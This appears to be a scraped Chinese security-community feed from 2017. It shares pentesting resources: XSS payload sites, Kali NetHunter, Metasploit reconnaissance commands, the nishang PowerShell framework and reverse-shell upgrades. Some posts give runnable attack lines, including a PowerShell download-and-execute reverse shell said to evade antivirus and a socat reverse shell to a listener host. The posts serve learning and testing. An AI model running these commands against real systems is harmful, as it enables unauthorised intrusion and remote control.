<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b2/3c/b23c795737adee8dc13ad0c866f32f05b6b4bdd374a2cd62d6fa8eee0396f1a4.jpg" width="25px"/> __K3vi__: 可以呀

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 贵不少

<img src="https://file.xiaomiquan.com/d9/8d/d98d18950409c1a21557e81ea5b11addd5d8e0929702f32011454f6efb1c5892.jpg" width="25px"/> __GEASS__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 太贵了，888一个……

<img src="https://file.xiaomiquan.com/45/79/4579de34e8ec11021f8b7bdfe0a39c2cd2548b177fe81fb27cc6b3ad1fb10d84.jpg" width="25px"/> __荣__ replies to <img src="https://file.xiaomiquan.com/b2/3c/b23c795737adee8dc13ad0c866f32f05b6b4bdd374a2cd62d6fa8eee0396f1a4.jpg" width="25px"/> __K3vi__: 那简直是暴利啊

<img src="https://file.xiaomiquan.com/b2/3c/b23c795737adee8dc13ad0c866f32f05b6b4bdd374a2cd62d6fa8eee0396f1a4.jpg" width="25px"/> __K3vi__ replies to <img src="https://file.xiaomiquan.com/45/79/4579de34e8ec11021f8b7bdfe0a39c2cd2548b177fe81fb27cc6b3ad1fb10d84.jpg" width="25px"/> __荣__: 需要有基础才能玩的来呀

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 昨天上班时候还在看python有什么现成脚本可以实现插U盘就自动拷贝电脑中文件的，你这就发出来了……cos大大给个便宜点的购买渠道呗～

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 这是熟人渠道 给不了的 我想想怎么弄吧

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 链接看了，突然又向导余弦大大的这句话：（不仅这个，我有全套）

<img src="https://file.xiaomiquan.com/67/6d/676dce5cc274939c3aff999a5a33001505c937dcf2325728952b4e67f9efb3e6.jpg" width="25px"/> __KevinShan__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 我也想买，从官网买399.9的套装卡在海关清单上，淘宝贵的有些离谱了

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__ replies to <img src="https://file.xiaomiquan.com/67/6d/676dce5cc274939c3aff999a5a33001505c937dcf2325728952b4e67f9efb3e6.jpg" width="25px"/> __KevinShan__: 这个应该是被US海关拦了吧？

<img src="https://file.xiaomiquan.com/c4/95/c49553be9376580d12182ad362ab1fa40a79f81573fe4d5b5c0516f38208bb7c.jpg" width="25px"/> __cj__: 想买啊，来个团购吧😄

<img src="https://file.xiaomiquan.com/e5/ed/e5ed19dec8b178c84d2b6dc707210d763fca1a37f8d64bf6776df8d5d2f9f6ae.jpg" width="25px"/> __Hi__ replies to <img src="https://file.xiaomiquan.com/67/6d/676dce5cc274939c3aff999a5a33001505c937dcf2325728952b4e67f9efb3e6.jpg" width="25px"/> __KevinShan__: 请问是海淘被海关扣下了吗？US扣的？

<img src="https://file.xiaomiquan.com/c5/29/c5293d5ddc68cbd7306f2c0cb0993648ea13aa18421dd2d79afaa5a74d506bc9.jpg" width="25px"/> __Maiko__ replies to <img src="https://file.xiaomiquan.com/67/6d/676dce5cc274939c3aff999a5a33001505c937dcf2325728952b4e67f9efb3e6.jpg" width="25px"/> __KevinShan__: 同求


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-17:


__#资源#__

 推荐个 XSS 资源大全：XSS Payloads


[http://www.xss-payloads.com/](http://www.xss-payloads.com/)



推：@XssPayloads

都需要翻~墙才能访问。更新还是很及时全面的，也算难得了。

这个网站我第一次知道还是当时我的 XSS'OR 早期版本被收集在上面。这个网站做了我以前一直想做的事，收集各种优秀攻击、利用代码、Papers 等，并不断更新。

对 XSS 感兴趣的同学可以好好浏览一遍。

<img src="https://images.xiaomiquan.com/Fq6sz8YsupYroZ5vDkT-swfqISKX?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Q6Y18fDvptww_NOBWCYNbJAI8WM=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/00/a2/00a24f7de90da6f6d096ad5a3775a540ec571b34d87b6b31e5556345691cf912.jpg" width="25px"/> __Avir4er__: 访问不了，403..

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/00/a2/00a24f7de90da6f6d096ad5a3775a540ec571b34d87b6b31e5556345691cf912.jpg" width="25px"/> __Avir4er__: 都说了要翻_墙

<img src="https://file.xiaomiquan.com/cc/8c/cc8cc0011e1e45d87b821aaf65f116d4635ef79dede9706c7a058c94d7b488fb.jpg" width="25px"/> __胡杭军__: 翻了，能访问twitter，却访问不了本链接。报403错误，没有权限。

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/cc/8c/cc8cc0011e1e45d87b821aaf65f116d4635ef79dede9706c7a058c94d7b488fb.jpg" width="25px"/> __胡杭军__: 不要使用gfwlist，全局翻

<img src="https://file.xiaomiquan.com/67/6d/676dce5cc274939c3aff999a5a33001505c937dcf2325728952b4e67f9efb3e6.jpg" width="25px"/> __KevinShan__: 一般挖xss，怎么算有效的xss，怎么去判断xss的影响？

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__ replies to <img src="https://file.xiaomiquan.com/67/6d/676dce5cc274939c3aff999a5a33001505c937dcf2325728952b4e67f9efb3e6.jpg" width="25px"/> __KevinShan__: 能做很多事情的那种呗，不然就是大网站危急用户的那种。就算危害大吧我觉得

<img src="https://file.xiaomiquan.com/64/90/649032a29005a37e93906d26f68a0492d5247ecf4cbfea97aa6b0e74a7a6b1b0.jpg" width="25px"/> __一个头两个大大大大大大大大大大大__ replies to <img src="https://file.xiaomiquan.com/00/a2/00a24f7de90da6f6d096ad5a3775a540ec571b34d87b6b31e5556345691cf912.jpg" width="25px"/> __Avir4er__: Tor可以


...

---

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ on 2017-07-16:

网络流量安全分析第二弹—发现端口扫描

许多入侵都是从端口扫描开始的，发现扫描行为是网络安全流量分析里重要的一环，本次分享如何从网络流量分析中发现端口扫描行为

(由于小密圈不支持图文混排，我写了个PDF)


__分享文件:__
[网络流量分析发现端口扫描-ATTOT.豆.pdf](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/2d/fa/2dfa44ebe22af926ef335d82bc7fc9e103953d5b1b1bc223fc4ab3363ed12fd2.jpg" width="25px"/> __Banana's__: 我爱你

<img src="https://file.xiaomiquan.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__ replies to <img src="https://file.xiaomiquan.com/2d/fa/2dfa44ebe22af926ef335d82bc7fc9e103953d5b1b1bc223fc4ab3363ed12fd2.jpg" width="25px"/> __Banana's__: 😘


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-16:


__#经验#__

  想刷黑手的同学，重点推荐一加1代（淘宝买二手就好），一加2、3、3T也行，如果你钱多的话。现在一加最新是5（没有4），但是5还不建议去刷，官方没出兼容方案，如果你不怕，可以自己折腾。

黑手可刷机型完整清单可以看官方这个链接：


[Home · offensive-security/kali-nethunter Wiki · Gi...](https://github.com/offensive-security/kali-nethunter/wiki)

 

一旦有一加5可刷黑手的新消息，我会乘势好好跟进并分享黑手使用经验。



...

<img src="https://file.xiaomiquan.com/b2/3c/b23c795737adee8dc13ad0c866f32f05b6b4bdd374a2cd62d6fa8eee0396f1a4.jpg" width="25px"/> __K3vi__: ZUK Z1也可以刷

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 当时就兴冲冲买了一加2😄

<img src="https://file.xiaomiquan.com/60/e4/60e47e828e20c259db7e6a604da3964fec6b1c5e5798187d47e63927ae9271a0.jpg" width="25px"/> __大芳的小明。💋__: 刷黑手是什么。😷（原谅无知的我）

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/60/e4/60e47e828e20c259db7e6a604da3964fec6b1c5e5798187d47e63927ae9271a0.jpg" width="25px"/> __大芳的小明。💋__: 黑客手机

<img src="https://file.xiaomiquan.com/a5/c5/a5c55f12eac59f3fad216a0b8016e5acaa88e86bc8477f0203f8402337a82f65.jpg" width="25px"/> __掉到鱼缸里的猫__: 反正有刷机险😂

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 有没有中文安装详细过程的博客  😍

<img src="https://file.xiaomiquan.com/d0/6e/d06e9943d6e64d54bc80e08131e1f1f454c448fedb956801c155d715e3a9a843.jpg" width="25px"/> __‭‭‭__: 3t刷成功了，用的是单天线的路由，文章中连接电脑的测试成功了，问题是csploit使用不正常，最简单的中间人不能正常运行，别提另一个软件了，还有那个扫描的软件是不是需要专门的硬件😂

<img src="https://file.xiaomiquan.com/ab/3e/ab3e0ce3f23e965ecc47fc82fa7e52c4f28e88f99d18032ad160eb3edfc09977.jpg" width="25px"/> __向上15度__: 怎么刷，有教程吗？😍

<img src="https://file.xiaomiquan.com/74/ab/74abebf3530d1f6750d72fe7669a6d76f77779d6c66552a6a545521b66fee4fc.jpg" width="25px"/> __I0ck_me__: 掉坑里了  刷成砖了  只能进入fastboot模式了  哪位大佬指点一下😓

<img src="https://file.xiaomiquan.com/73/4f/734f2c7364f4ef86e936145ef88229d700ac299eb89414ded45da3c1923caa9e.jpg" width="25px"/> __苏少‮蛋脸小的你下一了亲并‭__: 一加5我买了，不过好像真的没办法用官方的教程刷。坐等弦哥


...

---

<img src="https://file.xiaomiquan.com/57/4c/574c8964905db7d8e404276866e6f4c4ba1bc17edfdea859779872d8c7321078.jpg" width="25px"/> __Flypure@ATToT__ on 2017-07-15:

MSF内网渗透系列-信息收集

对内网进行渗透，首先我们要做好信息收集工作，摸清楚内网环境

总体上来说，内网环境无非两种：域和工作组。当然就只针对域的渗透，我们都可以单独拿出来，做一系列的教程了。

这里我们做无差别处理。下面进入本系列正题，利用MSF进行内网信息收集：

>本地常规信息收集

Windows：
[https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows](https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Windows)



Linux: 
[https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Linux](https://github.com/nixawk/pentest-wiki/tree/master/1.Information-Gathering/Linux)



>本地HASH  meterpreter下利用hashdump从SAM导出密码哈希值

>MSF端口扫描

利用search portscan查找相关模块。如：auxiliary/scanner/portscan/tcp,我们可以利用该模块扫描同段开3389的机器:

..msf>use auxiliary/scanner/portscan/tcp   //选择模块

..msf>set PORTS 3389                       //设置端口

..msf>set RHOSTS 192.168.0.1/24            //扫描192.168.0.1/24网段内开放3389的主机

>MSF服务扫描

SMB版本识别：auxiliary/scanner/smb/smb_version  来尝试识别windows的版本

MSSQL信息收集：search mssql相关模块，如auxiliary/scanner/mssql/mssql_ping 查询mssql监听的端口，默认1433

SSH版本信息：auxiliary/scanner/ssh/ssh_version

FTP版本识别：auxiliary/scanner/ftp/ftp_version

HTTP服务：auxiliary/scanner/http/http_header  我一般用来扫描内网中的WEB服务器，返回相关头信息

图：利用auxiliary/scanner/ssh/ssh_version识别metaslpoitable的ssh版本信息：

<img src="https://images.xiaomiquan.com/FhNBOpcgNqENAJ_T4XpzZc9iDlgZ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:--muZSfblaIxpdGW_mVD_44gmZs=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 嘿嘿。喜欢msf的教程

<img src="https://file.xiaomiquan.com/c5/7b/c57b4a0bfd789e3cd61d28a76dadf3c12803e6d245e7a9cd72b06f41e822e7f9.jpg" width="25px"/> __cmcc谷子地__: 黑产常用，内网大杀器


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-07-12:


__#工具#__

 nishang 牛逼的powershell渗透框架
玩渗透的都在夸powershell各种bypass，各种无文件入侵。我们当然得了解下了，有多强大，谁试谁知道！

nishang是作者nikhil_mitt在渗透测试过程中，根据实战经验编写出来的，各个脚本都有很强大的实战意义。
什么下载和执行、键盘记录、屏幕监视、内网扫描、抓HASH、用Mimikatz 抓密码、各式各样的反弹、反弹meterpreter shell还有删除补丁等等强大模块。
其中键盘记录跟屏幕监控，觉得挺有意思的。
键盘记录脚本会将记录的信息用POST方式发到你设置的URL上，读取到你设置的URL下你设置的特定内容它会停止记录。
屏幕监控开启后，会在对方电脑上开启一个端口，你用web访问它这个端口就会生成对方屏幕的截图，并且会实时刷新，挺有意思。
简单演示下：
C:\Users\Administrator>powershell IEX (New-Object Net.WebClient).DownloadString(
'
[http://192.168.1.190/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp](http://192.168.1.190/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp)

 -Reverse -
IPAddress 192.168.1.190 -port 8888

将你的利用脚本放到你的web服务器中，然后在你的webshell上直接执行上面这样的命令调用执行，直接加载进内存，所以bypass各种杀软。

还可以加载特定的exe程序进内存执行，只要没有写入磁盘动作，AV对它没任何反应。

可用插件太多了，地址在这里 
[GitHub - samratashok/nishang: Nishang - PowerShell...](https://github.com/samratashok/nishang)



另外照顾一下像我一样的小白，找了两篇不错的利用文章，小白看一遍，照着实验来一发是最好的了。
当然关于晋级的学习路线，就是想办法搞懂框架里面每个ps脚本，完全看懂，搞明白为什么这样编写，那样你不是大神都难啊！


[60字节 - 无文件渗透测试实验 - n0tr00t](https://www.n0tr00t.com/2017/03/09/penetration-test-without-file.html)

  这篇实验很不错


[http://www.4hou.com/technology/5962.html](http://www.4hou.com/technology/5962.html)

    这篇介绍了一些功能

<img src="https://images.xiaomiquan.com/Fm5xgpU8CtkJdA1HGdpE2Lc8iZ4o?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lUnN4kveeBAKsxpdmxom6PAP-Js=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FoXVJry5A5tEbpiAolQu7NpF5Yku?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:2XNEHgmrZhTpLawfaPYTimGy0kg=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 灰常强大

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 这两天刚把弦大前段时间推荐的那本书看完，深深感受到了powershell的强大之处。。

<img src="https://file.xiaomiquan.com/e2/cc/e2cc9141022b937ca894f7d126c0949727ba78c11838cfba6700c5b7641797b5.jpg" width="25px"/> __wanner__ replies to <img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 啥书啊？

<img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 太复杂看不太懂，问一下，60字节 - 无文件渗透测试实验 搭建环境没有源码，漏洞如何利用都不清楚如何实验。

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/48/eb/48eb0904e0d74da054d18a11105fe81d59c5a36c2056be97fe9cdd6b532af72a.jpg" width="25px"/> __战狼__: 你会用虚拟机不？先用虚拟机搭起那个拓扑图，这步可以做到吗？然后在一台web服务器上，放上nishang的脚本，那么就可以在你拿了webshell的那台机器上执行我上面贴的那条命令，就可以执行攻击脚本了。那一条还不懂，说出来，不要怕丑，一切以弄懂知识为主。

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 在一台虚拟机上多个系统如何多个ip？是使用vpn吗

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__: 虚拟机可以软件模拟出多个内网，方便做实验，以vmware为例，搞明白 编辑-虚拟网络编辑器里面的配置，同一个vmnet就是在同一个网络下。有什么再不懂的百度下

<img src="https://file.xiaomiquan.com/63/20/6320490a17494468438d741abe3e831c7276a2e342feb9d286668748bf540947.jpg" width="25px"/> __Mind℃__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 好的谢谢


...

---

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ on 2017-07-11:


__#姿势#__

 
__#漏洞复现#__

 
__#代码审计#__

 
IPB是一个集论坛展示与CMS的PHP平台。今年五月份爆出了一个漏洞，在4.1.19.2以下的版本，在convertutf8中存在xss，通过该xss可以构造csrf。这套系统本身是不开源的，但是我为了复现该漏洞，从网上下载了该平台的一个盗版。该文件我已经作为附件上传到小密圈中了，有兴趣的圈友可以看看。 


[有道云笔记](http://note.youdao.com/share/?id=76cbf6017d4bdfe7544b56587283ce30&type=note#/)

 

以后我会转为分享一些web代码审计的案例，有问题的欢迎评论区留言。


__分享文件:__
[IPB.zip](fileulrxxxxxxxxxxxxxxxxxxxfileulr)


...

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 调试的都快晕了，能请问一下是哪里对$controller进行了输出么

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: convertutf8/System/Output/Browser/Template.php

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 能具体到行么。。。这个文件当然看过了

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 里面有个模板，输出了controller变量。这个变量直接从request获取没经过过滤。

<img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__ replies to <img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 哦哦哦这里啊，太感谢了，调试的时候没有步进到这里，直接跳走了😂辛苦你了，又打开帮我看，我最近在学习代码审计，交个朋友吧～你私信可能屏蔽了，我发不过来

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__: 噢噢好，我最近都会分享一些代码审计的案例，你留意小密圈的动态就好。我小密圈没有屏蔽人，我看看是怎么回事。

<img src="https://file.xiaomiquan.com/63/d0/63d0b05ed5938e543b17689ddc40ce30365485a71ed6a24d7a40768910845fec.jpg" width="25px"/> __D_infinite@ATToT__ replies to <img src="https://file.xiaomiquan.com/8d/e2/8de2de5d6a1eb3d448658bdd79d07593b0268ecf828399fd6d6a3a2912077290.jpg" width="25px"/> __Shutdown-r__: 我跟其他圈友是可以正常私信的，跟你应该也是一样的。并没有屏蔽你。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-11:


__#资源#__

  C# 灰帽，非常期待此书！嗯，中文版不知道国内何时译出。

<img src="https://images.xiaomiquan.com/FphB0x6GKSB1hzrg6pb_DS8Ac3o-?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:gfy5VHMUm-Pte676xFpazaVkcN0=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 赞赞，如果需要看看pdf或者kindle版本的可以先下载看看，
[http://www.finelybook.com/gray-hat-c-a-hackers-guide-to-creating-and-automating-security-tools/](http://www.finelybook.com/gray-hat-c-a-hackers-guide-to-creating-and-automating-security-tools/)



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 赞，pdf都出来了

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 一般适合做图形化界面给小白做哦

<img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: 😂😂之前一直在找pdf

<img src="https://file.xiaomiquan.com/45/79/4579de34e8ec11021f8b7bdfe0a39c2cd2548b177fe81fb27cc6b3ad1fb10d84.jpg" width="25px"/> __荣__: 余大大，你来翻译吧😂

<img src="https://file.xiaomiquan.com/ab/50/ab5037f030837d6df17c3a88185b7134473c7f511f28d376dac98eb3d056b984.jpg" width="25px"/> __simon__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 👍

<img src="https://file.xiaomiquan.com/97/49/9749a15329841788c54b189977185cf705afe449bb7a22b5afc89e6f3811cd46.jpg" width="25px"/> __un1verses__ replies to <img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 哇这个网站好棒，今天找一本书谷歌了一天都没找到mobi格式。感谢！


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-11:


__#姿势#__

  升级简陋的 Shell 到完美交互的 TTYs 终端


[Upgrading shells to fully interactive TTYs](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

 

这篇文章很赞，以前我们反弹回来的 NC Shell，操作实在太过简陋，一个命令输错就意味着丢失 Shell，没历史，没 Tab，没 Vim，就是个最最简陋的 Shell。

反弹技巧不少，这里先不谈，有的是能得到完美的 TTYs 终端，这篇文章第一个方式其实也简单提了，虽然还不完美。

文章介绍了三个技巧，如下：

Using Python for a psuedo terminal

python -c 'import pty; pty.spawn("/bin/bash")'

Using socat

#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

Using stty options

# In reverse shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>

我想精于 Linux 的同学应该还会有其他更好的技巧吧？😏

<img src="https://images.xiaomiquan.com/Fj_Ou8qWblsD8PQbMkbsiFOsbVNk?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:m9ZuUhEYmVExE9s4WOF_-76vOkQ=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FvH1DFbKMjFYlnJOg75OJTcHz1YO?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:HXPfrhY8yBHQnFbwYRbCWl2s7hE=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/Fig865CAfX1G7zfSlHpk6qHQwWgE?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Q7-DgFAG9jPiRq6mRqmY5BwXZFU=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 无shell不欢

<img src="https://file.xiaomiquan.com/74/dd/74dd868df857e0ffec8613ae99f0891f0e7088f3533e8bd16f9614477984d3f6.jpg" width="25px"/> __‍迷途の狼__: 不错的技巧，不过linux下监听win下反弹的cmd 也是很蛋疼 一个字符输错 又得重新输入 还乱码

<img src="https://file.xiaomiquan.com/b4/82/b482e6485bf4a4d6d6fdd738268a244a4dc592e0d9241454f50752345ad531d7.jpg" width="25px"/> __dusts__: 不精通linux的想知道其他更好的技巧。。。。要是环境里没有python,没有socat，该如何。。。

